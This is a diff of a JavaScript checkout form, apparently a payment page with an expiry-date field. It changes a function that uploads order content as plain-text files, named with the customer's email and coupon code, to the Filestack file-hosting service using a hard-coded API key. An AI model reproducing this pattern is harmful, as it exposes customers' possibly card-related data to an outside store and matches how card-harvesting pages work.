@@ -247,26 +247,34 @@ document.addEventListener('DOMContentLoaded', function () {
   }
 
   // دالة لرفع الملف إلى Filestack
-  let orderNumber = 1;  // تعيين رقم تسلسلي للطلب
-  function uploadFileToFilestack(fileContent, email, couponCode) {
-    // توليد اسم الملف بناءً على رمز القسيمة ورقم الطلب والبريد الإلكتروني
-    const fileName = `${couponCode}_order${orderNumber}_${email}.txt`;
+ let orderNumber = 1; // تعيين رقم تسلسلي للطلب
 
-    // زيادة رقم الطلب للطلب التالي
-    orderNumber++;
+function uploadFileToFilestack(fileContent, email, couponCode) {
+  // توليد اسم الملف بناءً على رمز القسيمة ورقم الطلب والبريد الإلكتروني
+  const fileName = `${couponCode}_order${orderNumber}_${email}.txt`;
 
-    const client = filestack.init('Agq3czOxhQoWeCBLRltEez');  // استبدل بـ API Key الخاص بك
-    const fileBlob = new Blob([fileContent], { type: 'text/plain' });
-    client.upload(fileBlob, { filename: fileName })
-      .then((res) => {
-        console.log('File uploaded successfully:', res);
-        // إعادة توجيه المستخدم إلى صفحة "شكرًا"
-        window.location.href = 'thank-you.html';  // قم بتغيير الرابط إلى صفحة "شكراً" الخاصة بك
-      })
-      .catch((err) => {
-        console.error('Error uploading file:', err);
-      });
-  }
+  // زيادة رقم الطلب للطلب التالي
+  orderNumber++;
+
+  const client = filestack.init('Agq3czOxhQoWeCBLRltEez'); // استبدل بـ API Key الخاص بك
+  const fileBlob = new Blob([fileContent], { type: 'text/plain' });
+
+  // رفع الملف باستخدام اسم مخصص
+  client
+    .upload(fileBlob, {
+      onFileUploadStarted: (file) => {
+        file.name = fileName; // تعيين الاسم أثناء بدء الرفع
+      },
+    })
+    .then((res) => {
+      console.log('File uploaded successfully:', res);
+      // إعادة توجيه المستخدم إلى صفحة "شكرًا"
+      window.location.href = 'thank-you.html'; // قم بتغيير الرابط إلى صفحة "شكراً" الخاصة بك
+    })
+    .catch((err) => {
+      console.error('Error uploading file:', err);
+    });
+}
 
   // إضافة حدث لملء تاريخ الصلاحية تلقائيًا بـ "/"
   const expiryInput = document.getElementById('expiry');
